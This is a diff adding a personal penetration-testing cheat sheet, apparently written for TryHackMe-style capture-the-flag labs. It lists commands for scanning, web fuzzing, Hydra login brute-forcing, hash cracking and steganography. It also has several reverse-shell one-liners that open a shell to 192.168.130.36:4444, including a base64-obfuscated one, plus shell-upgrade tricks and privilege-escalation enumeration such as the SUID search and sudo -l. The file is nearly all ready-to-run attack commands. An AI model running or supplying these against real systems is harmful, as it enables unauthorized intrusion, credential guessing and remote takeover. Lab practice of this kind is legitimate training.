@@ -1,0 +1,31 @@
+TOOLS:
+	nmap -sS -p- --open -n -T4 -vvv <IP-адрес>
+	ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.81.180.85/FUZZ -mc all -c -v -fc 404
+	hydra -L userlist -P passlist protocol://address -vvv  
+	hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.82.132.253 http-form-post '/admin/:user=^USER^&pass=^PASS^:Username or password invalid' -vvv
+	katana -u https://10.81.185.232 -j | grep "THM"
+	binwalk -e filename
+	hashcat -m <hash type> <file storing your hash> <path to wordlist>
+	rdesktop -u username -p password IP
+	stegseek image wordlist
+	zbarimg image.png
+	java -jar /bin/stegsolve.jar
+REVERSE SHELL:
+	/bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.130.36/4444 0>&1"
+	nc 192.168.130.36 4444 -e /bin/bash
+	rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 192.168.130.36 4444 > /tmp/f
+	X=$(echo "YmFzaAo=" | base64 -d); echo "L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xMzAuMzYvNDQ0NCAwPiYxIgo" | base64 -d | $X
+REVERSE SHELL UPGRADE:
+	stty raw -echo && fg
+	stty rows $x columns $y
+	python3 -c 'import pty; pty.spawn("/bin/bash")'
+	export SHELL=bash; export TERM=xterm-256color; bash -i
+PRIVILEGE ESCALATION:
+	find / -perm -4000 2>/dev/null
+	sudo -l
+	(env || set) 2>/dev/null
+	ls -la /etc/cron.*
+OTHER:
+	ssh-keygen -t rsa -b 4096
+	sudo tcpdump -i icmp
+	sudo nc -l -p 4444
